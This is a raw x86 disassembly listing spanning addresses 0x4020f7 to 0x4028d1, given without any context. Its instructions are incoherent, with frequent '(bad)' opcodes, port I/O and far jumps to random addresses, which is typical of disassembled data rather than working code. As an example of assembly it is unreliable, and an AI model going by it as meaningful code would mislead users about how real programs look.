  4020f7:	scas   al,BYTE PTR es:[edi]
  4020f8:	xlat   BYTE PTR ds:[ebx]
  4020f9:	ins    DWORD PTR es:[edi],dx
  4020fa:	pushf  
  4020fb:	and    al,0xd
  4020fd:	ds pop esp
  4020ff:	sbb    al,0x68
  402101:	fcomp  st(1)
  402103:	pop    ebp
  402104:	xchg   edx,eax
  402105:	add    dl,BYTE PTR [eax-0x7b22374c]
  40210b:	ret    
  40210c:	jno    0x402134
  40210e:	aaa    
  40210f:	sub    BYTE PTR [eax-0x712c8e6b],cl
  402115:	in     eax,0xec
  402117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402118:	(bad)  
  402119:	sub    eax,0xb39ab3ef
  40211e:	inc    edi
  40211f:	pusha  
  402120:	pop    eax
  402121:	loop   0x402115
  402123:	push   esp
  402124:	lds    esp,FWORD PTR [ebp-0x20]
  402127:	inc    ebp
  402128:	and    BYTE PTR ds:0xc8588ae6,cl
  40212e:	out    0x93,al
  402130:	xlat   BYTE PTR ds:[ebx]
  402131:	mov    esi,0x5e20d9de
  402136:	fs aaa 
  402138:	jnp    0x402137
  40213a:	(bad)  
  40213b:	div    BYTE PTR ds:0x38d75696
  402141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402142:	fcmovbe st,st(5)
  402144:	cmp    BYTE PTR [ecx+0x68cd85d2],dl
  40214a:	xor    ebp,DWORD PTR [esi-0x2a985ff5]
  402150:	loop   0x40212e
  402152:	shl    DWORD PTR ds:0x2966e57b,1
  402158:	xchg   ecx,eax
  402159:	lods   eax,DWORD PTR ds:[esi]
  40215a:	push   ds
  40215b:	pop    ds
  40215c:	js     0x4021bf
  40215e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40215f:	retf   
  402160:	retf   
  402161:	or     DWORD PTR [edx+0x32],ebp
  402164:	jl     0x4021dd
  402166:	mov    ebx,DWORD PTR [esi-0x10899095]
  40216c:	xor    edi,DWORD PTR [edx+0x4d]
  40216f:	rol    BYTE PTR [ecx+0x536d9000],0x8e
  402176:	adc    dl,al
  402178:	xchg   esi,eax
  402179:	sbb    bh,dl
  40217b:	jmp    0xcc2f8140
  402180:	mov    ebp,0x295ef772
  402185:	xlat   BYTE PTR ds:[ebx]
  402186:	mov    edi,0xc8129e5e
  40218b:	cmp    edi,esi
  40218d:	cs jmp 0xe5fa:0x4eae5413
  402195:	cmp    BYTE PTR [ecx-0x7a],bh
  402198:	in     eax,dx
  402199:	cmp    BYTE PTR [edi-0x67],ah
  40219c:	add    eax,0xa4cff1e3
  4021a1:	in     eax,dx
  4021a2:	sub    bl,ah
  4021a4:	(bad)  [ebp+0x58]
  4021a7:	(bad)  
  4021a8:	imul   edx,DWORD PTR [esi+0x25efbe61],0x19e830a3
  4021b2:	(bad)  
  4021b3:	aam    0xf9
  4021b5:	add    BYTE PTR [esi],ch
  4021b7:	push   eax
  4021b8:	and    esp,DWORD PTR [ebp-0x3d848725]
  4021be:	xchg   esp,eax
  4021bf:	gs jge 0x4021e7
  4021c2:	add    DWORD PTR [esi-0x2d],edi
  4021c5:	ins    BYTE PTR es:[edi],dx
  4021c6:	push   ebp
  4021c7:	dec    ecx
  4021c8:	stos   DWORD PTR es:[edi],eax
  4021c9:	jnp    0x40219a
  4021cb:	pop    eax
  4021cc:	aam    0x2
  4021ce:	dec    eax
  4021cf:	xlat   BYTE PTR ds:[ebx]
  4021d0:	jmp    0xe570d5ab
  4021d5:	int3   
  4021d6:	xor    al,0x6
  4021d8:	das    
  4021d9:	fistp  DWORD PTR [ecx-0x56df05d]
  4021e0:	sbb    BYTE PTR [ebp+edx*1+0x18],bl
  4021e4:	pop    ebx
  4021e5:	stos   BYTE PTR es:[edi],al
  4021e6:	loope  0x4021a2
  4021e8:	adc    BYTE PTR [edi],ch
  4021ea:	inc    ebp
  4021eb:	xlat   BYTE PTR ds:[ebx]
  4021ec:	lods   eax,DWORD PTR es:[esi]
  4021ee:	xchg   ebx,eax
  4021ef:	stc    
  4021f0:	mov    ch,0x79
  4021f2:	mov    ebp,0x974ce8fc
  4021f7:	xor    esp,DWORD PTR [esi]
  4021f9:	jne    0x40221e
  4021fb:	cmp    al,0xeb
  4021fd:	sbb    BYTE PTR [ebx+0x5c],0x97
  402201:	ja     0x40226b
  402203:	call   DWORD PTR [ebp-0x13]
  402206:	loop   0x4021b2
  402208:	(bad)  
  402209:	jmp    0x4021e3
  40220b:	(bad)  
  40220c:	mov    esp,esp
  40220e:	mov    dh,0xcb
  402210:	xor    BYTE PTR [esi+0x2],bh
  402213:	and    DWORD PTR [esi],0x51
  402216:	scas   al,BYTE PTR es:[edi]
  402217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402218:	std    
  402219:	cmp    al,0x1f
  40221b:	pushf  
  40221c:	icebp  
  40221d:	dec    ebp
  40221e:	ror    ebp,0xc3
  402221:	bound  ecx,QWORD PTR [eax+0x5d31e694]
  402227:	nop
  402228:	dec    edi
  402229:	cmp    edx,ebx
  40222b:	or     BYTE PTR [edx-0x39a0c94a],cl
  402231:	mov    eax,ss
  402233:	or     BYTE PTR [ebp+0x6b],cl
  402236:	pop    eax
  402237:	(bad)  
  402238:	lods   al,BYTE PTR ds:[esi]
  402239:	aam    0x91
  40223b:	icebp  
  40223c:	and    eax,0xab2ad64c
  402241:	pop    es
  402242:	stos   BYTE PTR es:[edi],al
  402243:	fucomi st,st(5)
  402245:	or     eax,0xad025724
  40224a:	push   ebp
  40224b:	mov    bl,al
  40224d:	mov    edx,0x7c2f5b2
  402252:	mov    ecx,0x9e563
  402257:	mov    al,ds:0x9a061ca1
  40225c:	out    0x4a,al
  40225e:	(bad)  
  40225f:	repnz sbb dl,al
  402262:	adc    ch,bh
  402264:	sub    BYTE PTR ds:0x94d3a821,bl
  40226a:	shl    BYTE PTR [eax-0x72c329e4],cl
  402270:	iret   
  402271:	fnstcw WORD PTR [ebp-0x3b]
  402274:	push   es
  402275:	not    BYTE PTR [ecx+0x163b02e1]
  40227b:	and    al,0xb7
  40227d:	jns    0x4022b0
  40227f:	cwd    
  402281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402282:	push   cs
  402283:	fild   WORD PTR [esp+esi*8]
  402286:	(bad)  
  402287:	nop
  402288:	mov    bl,0xc2
  40228a:	inc    esp
  40228b:	xchg   ebx,eax
  40228c:	xchg   ebx,eax
  40228d:	ret    0x8f1a
  402290:	mov    dl,ch
  402292:	cmp    ah,ch
  402294:	pop    eax
  402295:	je     0x402279
  402297:	gs test al,0xdd
  40229a:	push   ds
  40229b:	adc    ah,BYTE PTR [ecx-0x66]
  40229e:	outs   dx,DWORD PTR ds:[esi]
  40229f:	ror    ebp,cl
  4022a1:	sub    esi,ebx
  4022a3:	popa   
  4022a4:	dec    ebx
  4022a5:	xor    al,0x6c
  4022a7:	arpl   sp,bp
  4022a9:	xlat   BYTE PTR ds:[ebx]
  4022aa:	aas    
  4022ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022ac:	jnp    0x4022e1
  4022ae:	ja     0x4022c5
  4022b0:	int    0x7e
  4022b2:	js     0x402311
  4022b4:	pop    esp
  4022b5:	(bad)  
  4022b6:	punpckldq mm3,DWORD PTR [edx-0x1a]
  4022ba:	sahf   
  4022bb:	sbb    ebp,esp
  4022bd:	mov    al,0x19
  4022bf:	or     al,BYTE PTR [esi+0x23]
  4022c2:	xor    al,0xa3
  4022c4:	inc    esp
  4022c5:	adc    dh,BYTE PTR [edi+0x127781cc]
  4022cb:	aam    0x1
  4022cd:	push   ebx
  4022ce:	xchg   ebp,eax
  4022cf:	or     edx,DWORD PTR [esi+0x40]
  4022d2:	stc    
  4022d3:	mov    ch,0x58
  4022d5:	outs   dx,DWORD PTR ds:[esi]
  4022d6:	xor    ebx,ebx
  4022d8:	and    DWORD PTR [eax+0x71b7ed82],ebp
  4022de:	fwait
  4022df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e0:	fdiv   QWORD PTR [ebp-0x78]
  4022e3:	imul   eax,DWORD PTR [ecx+0x46],0x23158b5f
  4022ea:	imul   esp,DWORD PTR [eax+ecx*8+0x3941f2e],0xc4cd7ea4
  4022f5:	sar    DWORD PTR ss:[ebx],1
  4022f8:	mov    ebp,0x2adc423
  4022fd:	adc    al,0x74
  4022ff:	cmp    DWORD PTR [eax-0x53],ebp
  402302:	aam    0x1b
  402304:	sub    BYTE PTR [eax],0xa2
  402307:	lahf   
  402308:	inc    edx
  402309:	push   ecx
  40230a:	bound  esi,QWORD PTR [ecx-0x68]
  40230d:	or     DWORD PTR [eax+0x7b],esp
  402310:	rcr    cl,1
  402312:	inc    esp
  402313:	nop
  402314:	add    BYTE PTR [eax],dl
  402316:	or     al,0x35
  402318:	test   dl,bl
  40231a:	clc    
  40231b:	jmp    0x4022b8
  40231d:	push   ecx
  40231e:	mov    WORD PTR [ecx-0x78a52f61],?
  402324:	out    0x6e,eax
  402326:	inc    ebp
  402327:	int    0x54
  402329:	fdiv   DWORD PTR [esi-0x5749a4f3]
  40232f:	or     eax,0x4bc4bbde
  402334:	fiadd  DWORD PTR [ebp+0x56913379]
  40233a:	inc    ebx
  40233b:	dec    eax
  40233c:	jl     0x402347
  40233e:	mov    eax,0x50334e58
  402343:	push   0x78
  402345:	mov    eax,ds:0xe5f6b005
  40234a:	mov    WORD PTR [edx+0x785afaa7],ds
  402350:	jmp    0x471970e4
  402355:	adc    DWORD PTR [ecx+0x38],ebp
  402358:	imul   ecx,DWORD PTR [ebx-0x3b3099e],0xffffffe2
  40235f:	inc    eax
  402360:	push   eax
  402361:	iret   
  402362:	ins    DWORD PTR es:[edi],dx
  402363:	cmc    
  402364:	stos   BYTE PTR es:[edi],al
  402365:	(bad)  
  402366:	or     edx,ebp
  402368:	pop    ds
  402369:	mov    edi,0x19c0c9b1
  40236e:	push   ds
  40236f:	cmp    ecx,DWORD PTR [ecx]
  402371:	sti    
  402372:	in     al,0x49
  402374:	das    
  402375:	cwde   
  402376:	test   al,0x60
  402378:	jg     0x4023b1
  40237a:	cmp    eax,0xf4249d16
  40237f:	mov    WORD PTR [ecx+0x47],es
  402382:	mov    eax,0x61fbee84
  402387:	xor    ecx,DWORD PTR [esi*4-0x7c2f509]
  40238e:	and    al,0xf2
  402390:	ins    DWORD PTR es:[edi],dx
  402391:	dec    ebp
  402392:	xor    edx,esp
  402394:	jnp    0x402392
  402396:	add    BYTE PTR [eax+0x4978c27b],ah
  40239c:	in     eax,0xcb
  40239e:	shl    BYTE PTR [eax+0x4905c6ea],1
  4023a4:	mov    edi,0x71d50200
  4023a9:	push   edi
  4023aa:	sub    DWORD PTR [eax],esp
  4023ac:	push   es
  4023ad:	sbb    al,0xd0
  4023af:	jl     0x4023f6
  4023b1:	sbb    BYTE PTR [ebx+0x4e2841b9],ah
  4023b7:	aaa    
  4023b8:	mov    ch,0x1c
  4023ba:	mov    ch,0x1c
  4023bc:	ds cmp al,0xb0
  4023bf:	daa    
  4023c0:	lods   eax,DWORD PTR ds:[esi]
  4023c1:	push   edx
  4023c2:	(bad)  
  4023c3:	in     eax,dx
  4023c4:	add    al,0x50
  4023c6:	push   edx
  4023c7:	cmp    esp,DWORD PTR [esi]
  4023c9:	lock adc eax,0x7d075e7f
  4023cf:	pop    ecx
  4023d0:	push   esp
  4023d1:	mov    ds:0x19ea4524,eax
  4023d6:	xchg   ecx,eax
  4023d7:	inc    edi
  4023d8:	push   ebp
  4023d9:	cli    
  4023da:	pop    edx
  4023db:	out    0x96,al
  4023dd:	pop    ds
  4023de:	lahf   
  4023df:	sub    edi,0xd0b7d0c7
  4023e5:	mov    ?,edi
  4023e7:	and    al,0xb5
  4023e9:	dec    ebp
  4023ea:	inc    ebp
  4023eb:	mov    esp,0x2aabeaff
  4023f0:	rcr    BYTE PTR [edx-0x38],cl
  4023f3:	xor    al,0xc1
  4023f5:	fs push ss
  4023f7:	leave  
  4023f8:	xchg   ebx,eax
  4023f9:	cmp    al,BYTE PTR ds:0xe3450ac3
  4023ff:	pop    esp
  402400:	mov    eax,ds:0xe19cf008
  402405:	aas    
  402406:	xor    al,0x2a
  402408:	dec    esi
  402409:	scas   eax,DWORD PTR es:[edi]
  40240a:	push   esp
  40240b:	and    al,0x49
  40240d:	dec    edx
  40240e:	adc    esi,DWORD PTR [ebp-0x10d70505]
  402414:	xchg   ebx,eax
  402415:	aas    
  402416:	jo     0x4023c4
  402418:	cmp    DWORD PTR ds:0x71ee9c29,ebx
  40241e:	cmp    DWORD PTR [eax+0x1a876c7c],eax
  402424:	(bad)  
  402425:	jmp    0x7335621e
  40242a:	sbb    DWORD PTR [edx-0x4d39e257],esp
  402430:	xor    dl,BYTE PTR ss:[ecx+ebx*4-0x7c9049cb]
  402438:	jmp    0xa48b:0xddff9d04
  40243f:	dec    edx
  402440:	loope  0x4023c7
  402442:	mov    dl,0xe4
  402444:	jg     0x4023c8
  402446:	stc    
  402447:	(bad)  
  402448:	cwde   
  402449:	xor    cl,0x7e
  40244c:	ror    BYTE PTR gs:0x99adbe74,cl
  402453:	cmc    
  402454:	das    
  402455:	sbb    BYTE PTR [edi],dl
  402457:	lods   al,BYTE PTR ds:[esi]
  402458:	dec    esp
  402459:	ret    0xf660
  40245c:	stos   BYTE PTR es:[edi],al
  40245d:	add    ebx,DWORD PTR [esi]
  40245f:	mov    DWORD PTR [edi+ebx*1-0x6fe5b12d],eax
  402466:	xchg   ebp,eax
  402467:	shl    BYTE PTR [esi-0x98b7b23],0xe6
  40246e:	xchg   BYTE PTR [edx],dh
  402470:	(bad)  
  402471:	or     eax,0x6deb030a
  402476:	dec    ecx
  402477:	sub    eax,edx
  402479:	push   es
  40247a:	add    bh,BYTE PTR [edi-0xe]
  40247d:	bound  esi,QWORD PTR [eax-0x26cee326]
  402483:	add    al,BYTE PTR [ecx-0x75]
  402486:	sub    DWORD PTR [edi+0x6fb23674],edi
  40248c:	enter  0xc7a0,0x7d
  402490:	xlat   BYTE PTR ds:[ebx]
  402491:	mov    dl,0x9
  402493:	inc    ecx
  402494:	cmp    eax,0x68786e81
  402499:	adc    BYTE PTR [eax-0x13d0a457],cl
  40249f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a0:	sar    BYTE PTR [esi-0x13],1
  4024a3:	sti    
  4024a4:	outs   dx,DWORD PTR ds:[esi]
  4024a5:	out    dx,al
  4024a6:	hlt    
  4024a7:	mov    ah,0xf1
  4024a9:	or     BYTE PTR [esi],0xb6
  4024ac:	pop    ebp
  4024ad:	pop    ebp
  4024ae:	std    
  4024af:	(bad)  
  4024b0:	cmp    ch,ch
  4024b2:	xchg   esi,eax
  4024b3:	mov    ebp,DWORD PTR [edx-0x1842eb0f]
  4024b9:	push   0xffffffe1
  4024bb:	push   es
  4024bc:	sbb    DWORD PTR [edi],ebp
  4024be:	idiv   DWORD PTR [eax]
  4024c0:	lods   al,BYTE PTR ds:[esi]
  4024c1:	lods   al,BYTE PTR ds:[esi]
  4024c2:	or     eax,0xdf47974f
  4024c7:	cmp    DWORD PTR [edi],eax
  4024c9:	push   ebx
  4024ca:	mov    ebx,0x68754f51
  4024cf:	scas   eax,DWORD PTR es:[edi]
  4024d0:	imul   ebx
  4024d2:	aaa    
  4024d3:	push   cs
  4024d4:	aaa    
  4024d5:	cmc    
  4024d6:	popf   
  4024d7:	stc    
  4024d8:	xor    esp,edi
  4024da:	mov    al,ds:0x9f8f8393
  4024df:	and    BYTE PTR [eax+0x6e],bh
  4024e2:	nop
  4024e3:	mov    eax,0x78548b41
  4024e8:	outs   dx,BYTE PTR ds:[esi]
  4024e9:	jnp    0x40254e
  4024eb:	cdq    
  4024ec:	fs dec esp
  4024ee:	fwait
  4024ef:	in     al,0x3b
  4024f1:	pop    ds
  4024f2:	xor    eax,0x4c7f048c
  4024f7:	jo     0x402547
  4024f9:	(bad)  
  4024fa:	adc    ah,ch
  4024fc:	ins    DWORD PTR es:[edi],dx
  4024fd:	cwde   
  4024fe:	dec    ecx
  4024ff:	stc    
  402500:	xchg   BYTE PTR [eax+0x2c],bl
  402503:	mov    eax,ds:0x7d775026
  402508:	sti    
  402509:	sbb    eax,0x3d38b182
  40250e:	dec    edx
  40250f:	pop    ebp
  402510:	push   ds
  402511:	je     0x40254b
  402513:	add    edi,DWORD PTR [eax-0x4d236048]
  402519:	mov    dl,0x31
  40251b:	mov    ecx,fs
  40251d:	jmp    0xb8cc:0x280aa57a
  402524:	inc    eax
  402525:	mov    ch,0x47
  402527:	xchg   ebx,eax
  402528:	mov    al,ds:0xd93d6e36
  40252d:	cmp    DWORD PTR [edx+0x3b],ecx
  402530:	or     eax,0x6b716265
  402535:	pusha  
  402536:	xchg   ebp,eax
  402537:	push   0xffffffc9
  402539:	sbb    ebx,DWORD PTR [edi+eax*1-0x13ceeb92]
  402540:	pusha  
  402541:	cli    
  402542:	mov    ebx,0xd20fd246
  402547:	mov    eax,ds:0x56a1882e
  40254c:	fstp   DWORD PTR [esi]
  40254e:	jo     0x4025ac
  402550:	mov    dh,0x3f
  402552:	jnp    0x4025c9
  402554:	dec    esp
  402555:	pop    ds
  402556:	jp     0x4025d6
  402558:	xchg   ebx,eax
  402559:	lahf   
  40255a:	push   esi
  40255b:	imul   ebx,DWORD PTR [edi-0xb],0xe28ad152
  402562:	fdivr  st,st(7)
  402564:	mov    ebp,0x5c5761b0
  402569:	mov    al,ds:0x57aa3f46
  40256e:	sub    DWORD PTR [edx],esi
  402570:	sub    edx,edx
  402572:	into   
  402573:	dec    esi
  402574:	jmp    0xaa1a:0xa1628f61
  40257b:	nop
  40257c:	inc    ebp
  40257d:	call   0x825bbd1e
  402582:	stos   DWORD PTR es:[edi],eax
  402583:	pop    ds
  402584:	je     0x40250d
  402586:	aam    0x15
  402588:	cli    
  402589:	fcom   QWORD PTR [edx]
  40258b:	add    al,0x5
  40258d:	in     al,0x3d
  40258f:	call   0x1ed25d94
  402594:	mov    eax,ebx
  402596:	and    edi,DWORD PTR [ebp+0x33]
  402599:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40259b:	jbe    0x4025d2
  40259d:	inc    edx
  40259e:	daa    
  40259f:	fisubr DWORD PTR [esi-0x43844e38]
  4025a5:	push   eax
  4025a6:	push   ebp
  4025a7:	dec    esp
  4025a8:	sbb    DWORD PTR [ebp+0x4d49ee2e],0x7b4adfb4
  4025b2:	jne    0x4025e1
  4025b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b5:	inc    edx
  4025b6:	aam    0x49
  4025b8:	out    dx,eax
  4025b9:	inc    esp
  4025ba:	sti    
  4025bb:	fmul   DWORD PTR ds:[eax-0x6f7654b9]
  4025c2:	inc    edi
  4025c3:	clc    
  4025c4:	mov    ah,0x94
  4025c6:	ins    DWORD PTR es:[edi],dx
  4025c7:	jae    0x4025e5
  4025c9:	enter  0x771d,0x4c
  4025cd:	ins    DWORD PTR es:[edi],dx
  4025ce:	jnp    0x402611
  4025d0:	out    0xa,al
  4025d2:	(bad)  
  4025d4:	cwde   
  4025d5:	outs   dx,BYTE PTR ds:[esi]
  4025d6:	pop    ds
  4025d7:	jge    0x4025ab
  4025d9:	push   ebx
  4025da:	jns    0x40255c
  4025dc:	out    0x1d,eax
  4025de:	mov    BYTE PTR [ebx+0x1a],dl
  4025e1:	imul   eax,ecx,0x48
  4025e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025e5:	das    
  4025e6:	rcl    BYTE PTR [eax],cl
  4025e8:	ret    0x97f4
  4025eb:	cmp    cl,BYTE PTR [ecx+0x51154e91]
  4025f1:	pushf  
  4025f2:	mov    eax,0x5e5b738
  4025f7:	retf   0xc19b
  4025fa:	adc    edi,ebx
  4025fc:	push   ebp
  4025fd:	ds shl edi,cl
  402600:	mov    bh,0x82
  402602:	jne    0x40261c
  402604:	out    dx,eax
  402605:	cmp    eax,0xe81782e1
  40260a:	push   ss
  40260b:	mov    BYTE PTR [ecx-0x47f32c68],al
  402611:	mov    edi,0xe36e6ab0
  402616:	stc    
  402617:	out    dx,eax
  402618:	push   0xffffffd6
  40261a:	ds call 0x42cd:0xa4ecb1d4
  402622:	aaa    
  402623:	mov    eax,ds:0x2b2e0e43
  402628:	mov    ecx,0xa716d097
  40262d:	sub    BYTE PTR ds:0xd42403cd,ah
  402633:	gs and eax,0xb6bf1e40
  402639:	fucomi st,st(3)
  40263b:	shr    BYTE PTR [eax],cl
  40263d:	aam    0x2
  40263f:	sbb    al,0xdb
  402641:	retf   0x2359
  402644:	lock (bad) 
  402646:	imul   edx,ebp,0xb6b6bcda
  40264c:	cs (bad) 
  40264e:	xchg   esp,eax
  40264f:	mov    WORD PTR [ecx+eax*1-0x1094a042],gs
  402656:	repnz add al,0x3f
  402659:	push   esi
  40265a:	cdq    
  40265b:	mov    eax,0xcc6c0200
  402660:	inc    ebx
  402661:	sahf   
  402662:	int    0x17
  402664:	adc    ebx,DWORD PTR [esi+0x2d]
  402667:	push   edi
  402668:	aaa    
  402669:	arpl   WORD PTR [edx-0x73b4e3bb],bx
  40266f:	xchg   esi,eax
  402670:	xchg   edx,eax
  402671:	dec    esp
  402672:	in     eax,0x93
  402674:	mov    edi,0x5ce692a7
  402679:	mov    ebx,edx
  40267b:	fidivr DWORD PTR [ebp-0x7944c254]
  402681:	cmp    BYTE PTR [edx],bl
  402683:	jmp    0x402701
  402685:	nop
  402686:	sahf   
  402687:	mov    ah,0xef
  402689:	mov    eax,ds:0x672e1fac
  40268e:	xor    ch,BYTE PTR [esi+0x1e2c0037]
  402694:	and    eax,0x8d3e24d6
  402699:	sub    BYTE PTR [ecx],dl
  40269b:	sar    BYTE PTR [esi-0x27],cl
  40269e:	mov    esi,0xaa9c7f9
  4026a3:	jno    0x4026fb
  4026a5:	adc    ch,BYTE PTR [ecx+0x60fa8bb]
  4026ab:	pusha  
  4026ac:	jp     0x40267d
  4026ae:	cmc    
  4026af:	(bad)  
  4026b0:	push   ebp
  4026b1:	jge    0x40264c
  4026b3:	repnz pop esp
  4026b5:	sar    BYTE PTR [ebx-0x18],cl
  4026b8:	push   0xffffff87
  4026ba:	adc    edx,DWORD PTR [esi+0x69]
  4026bd:	fwait
  4026be:	or     eax,0x798b7a94
  4026c3:	addr16 pop esp
  4026c5:	aas    
  4026c6:	xchg   esp,eax
  4026c7:	test   eax,0x597a286f
  4026cc:	sbb    eax,0x8ada16a
  4026d1:	pushaw 
  4026d3:	add    al,0xf9
  4026d5:	imul   BYTE PTR [ebx]
  4026d7:	adc    DWORD PTR [edi+ecx*1+0xf],ecx
  4026db:	arpl   WORD PTR [esi],di
  4026dd:	mov    ds:0x6106ef,eax
  4026e2:	push   edi
  4026e3:	sti    
  4026e4:	jae    0x402694
  4026e6:	sub    esi,DWORD PTR ds:0xf7d9f260
  4026ec:	sbb    ebx,DWORD PTR [ecx+0x6bb2ef45]
  4026f2:	pop    ss
  4026f3:	inc    esp
  4026f4:	ror    DWORD PTR [edi-0x4964d972],1
  4026fa:	leave  
  4026fb:	jmp    0x6232:0xe52b49b5
  402702:	sbb    eax,0x1d29ef25
  402707:	or     DWORD PTR [eax+0x6e59a234],edx
  40270d:	shr    BYTE PTR [eax+0x17],cl
  402710:	inc    edx
  402711:	in     al,0x8c
  402713:	in     eax,0xd5
  402715:	popf   
  402716:	jle    0x4026f2
  402718:	push   0x5f
  40271a:	adc    al,0xeb
  40271c:	call   0xa7b4:0x4ca064a6
  402723:	mov    ebp,0x2fa20702
  402728:	mov    DWORD PTR [ebp-0x3c],eax
  40272b:	push   cs
  40272c:	dec    esp
  40272d:	push   ebx
  40272e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40272f:	or     eax,0x1bb4f7db
  402734:	cs stc 
  402736:	push   eax
  402737:	arpl   WORD PTR [ecx-0x47],ax
  40273a:	adc    al,0xc9
  40273c:	repnz xor dl,cl
  40273f:	ds push 0xd1387033
  402745:	idiv   BYTE PTR [ecx]
  402747:	retf   0xa481
  40274a:	jmp    0xf447:0x9ef87174
  402751:	adc    al,BYTE PTR [edi-0x35ab5bf9]
  402757:	ins    BYTE PTR es:[edi],dx
  402758:	pop    esp
  402759:	pushf  
  40275a:	cli    
  40275b:	outs   dx,DWORD PTR ds:[esi]
  40275c:	jg     0x402741
  40275e:	xor    edi,DWORD PTR [ebx]
  402760:	jns    0x40271c
  402762:	clc    
  402763:	sub    al,bh
  402765:	(bad)  
  402766:	cs in  eax,dx
  402768:	push   eax
  402769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40276a:	mov    ch,0xb
  40276c:	rcr    DWORD PTR [edx-0x13],cl
  40276f:	or     eax,0x5718820f
  402774:	xor    edx,eax
  402776:	jge    0x402701
  402778:	push   edi
  402779:	jmp    0xfc4d4935
  40277e:	leave  
  40277f:	push   eax
  402780:	imul   eax,esi,0x4b
  402783:	pop    eax
  402784:	push   es
  402785:	aas    
  402786:	mov    ecx,0x816d2c51
  40278b:	mov    ah,0xf3
  40278d:	xchg   esi,eax
  40278e:	fidivr WORD PTR [ebp+0x50]
  402791:	mov    ds:0x7e633b75,al
  402796:	push   edi
  402797:	jne    0x4027f7
  402799:	loopne 0x40273a
  40279b:	call   0x171e:0x3e6ac3b3
  4027a2:	pop    esp
  4027a3:	push   ds
  4027a4:	jo     0x40274e
  4027a6:	push   esi
  4027a7:	add    dh,bl
  4027a9:	daa    
  4027aa:	sub    ebp,esi
  4027ac:	fsubr  DWORD PTR [ebp-0x59]
  4027af:	pop    edx
  4027b0:	mov    bl,BYTE PTR [eax+0x52ee49c1]
  4027b6:	dec    edx
  4027b7:	int    0x84
  4027b9:	xor    DWORD PTR [edi+ecx*8+0x37],ebx
  4027bd:	shr    BYTE PTR [edx],1
  4027bf:	(bad)  
  4027c0:	enter  0x1ee9,0xfb
  4027c4:	push   edx
  4027c5:	mov    WORD PTR [ecx],ds
  4027c7:	push   edx
  4027c8:	cli    
  4027c9:	adc    eax,0x9f534e3d
  4027ce:	imul   esp,DWORD PTR [ebp+0x934bd89],0xffffff97
  4027d5:	xchg   edi,eax
  4027d6:	dec    eax
  4027d7:	fst    DWORD PTR [esi]
  4027d9:	push   ss
  4027da:	adc    BYTE PTR [eax+0x71],0x88
  4027de:	adc    eax,0xa07d361b
  4027e3:	stos   BYTE PTR es:[edi],al
  4027e4:	jns    0x402772
  4027e6:	or     ah,BYTE PTR [ebp+0x18ecb9a4]
  4027ec:	and    edi,DWORD PTR [ecx-0x35a68770]
  4027f2:	push   0x3094f3fb
  4027f7:	push   ebp
  4027f8:	mov    ds:0x463fea35,al
  4027fd:	ret    0xbc33
  402800:	pop    esi
  402801:	jg     0x4027af
  402803:	adc    ecx,DWORD PTR ds:0xacb25d2f
  402809:	mov    ah,0xe4
  40280b:	xor    eax,0xc7b7266c
  402810:	test   al,0x6c
  402812:	sbb    DWORD PTR [edi-0x26],ebx
  402815:	out    dx,al
  402816:	mov    ah,bl
  402818:	pop    esi
  402819:	in     al,dx
  40281a:	mov    al,ds:0xcaeb2ad1
  40281f:	fldz   
  402821:	out    dx,al
  402822:	js     0x402833
  402824:	bnd jmp 0x402893
  402827:	aaa    
  402828:	popa   
  402829:	dec    ecx
  40282a:	jbe    0x402871
  40282c:	mov    cl,0x79
  40282e:	fisub  DWORD PTR [eax-0x15]
  402831:	jbe    0x4027e4
  402833:	ins    BYTE PTR es:[edi],dx
  402834:	adc    DWORD PTR [ecx+edi*1-0x7c126817],ebp
  40283b:	test   BYTE PTR [edx-0x28bc55d2],0x6
  402842:	mov    ebp,0xed424ca3
  402847:	(bad)  
  402848:	cmp    BYTE PTR [esi],bh
  40284a:	xor    al,0xc5
  40284c:	xchg   ebx,eax
  40284d:	mov    bh,0x89
  40284f:	cmp    al,0x1f
  402851:	imul   ebp,DWORD PTR [ebx+0x3facd65a],0xfb8028f1
  40285b:	jg     0x40288c
  40285d:	lods   al,BYTE PTR ds:[esi]
  40285e:	add    eax,esp
  402860:	daa    
  402861:	inc    esp
  402862:	imul   edx,DWORD PTR [ebp+0x5001f3ed],0x8a2243b8
  40286c:	mov    ecx,ecx
  40286e:	stc    
  40286f:	(bad)  
  402870:	fist   DWORD PTR [ebp+eax*1+0x73cf7e79]
  402877:	js     0x4028d5
  402879:	push   edx
  40287a:	rol    cl,0x56
  40287d:	cli    
  40287e:	(bad)  
  402880:	ins    BYTE PTR es:[edi],dx
  402881:	ds ret 0x48da
  402885:	es repnz pop es
  402888:	sbb    ebx,edi
  40288a:	fcmovbe st,st(7)
  40288c:	lods   al,BYTE PTR ds:[esi]
  40288d:	mov    esp,0x6ddfedbf
  402892:	fdivr  QWORD PTR [eax+esi*1]
  402895:	in     al,0x6d
  402897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402898:	xchg   edi,eax
  402899:	add    BYTE PTR [ebp+esi*2+0x3136a37f],0xa0
  4028a1:	enter  0x46ea,0xe3
  4028a5:	dec    esi
  4028a6:	and    edi,DWORD PTR [esi+0x67]
  4028a9:	dec    ebp
  4028aa:	inc    ecx
  4028ac:	add    BYTE PTR [eax],dh
  4028ae:	cmc    
  4028af:	pop    ds
  4028b0:	inc    edx
  4028b1:	mov    edi,0xf60c5669
  4028b6:	pushf  
  4028b7:	aam    0xa8
  4028b9:	iret   
  4028ba:	mov    ebp,0xcd25cd5c
  4028bf:	inc    esi
  4028c0:	push   eax
  4028c1:	sti    
  4028c2:	sbb    eax,0x652c2994
  4028c7:	test   al,0x80
  4028c9:	adc    dh,BYTE PTR [esi+0x46d8db63]
  4028cf:	loopne 0x4028c5
  4028d1:	sub    al,BYTE PTR [eax+0x72]
